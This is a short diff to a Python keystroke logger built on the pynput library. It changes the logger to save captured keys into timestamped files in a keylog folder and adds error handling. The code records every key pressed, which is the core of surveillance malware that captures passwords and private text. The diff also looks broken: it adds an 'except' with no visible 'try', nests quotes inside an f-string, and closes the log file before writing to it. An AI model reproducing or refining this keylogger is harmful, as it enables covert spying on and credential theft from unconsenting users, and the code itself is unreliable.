@@ -2,8 +2,9 @@ from pynput import keyboard
 import os
 import time
 
-file = open('keylog.txt', 'a')
-file.write('Start keylogging\n')
+if not os.path.exists('./keylog'):
+    os.makedirs('./keylog')
+file = open(f'./keylog/keylog_{time.strftime('%Y-%m-%d %H-%M-%S')}.txt', 'w')
 file.close()
 
 def format_special_key(key):
@@ -27,7 +28,10 @@ def on_press(key):
         key = format_special_key(key)
         key = str(key).replace('Key.', '')
         file.write(f"{str(key)}")
-    file.close()
+    except Exception as e:
+        print(f'Error: {e}')
+    finally:
+        file.close()
         
 with keyboard.Listener(on_press=on_press) as listener:
     listener.join()
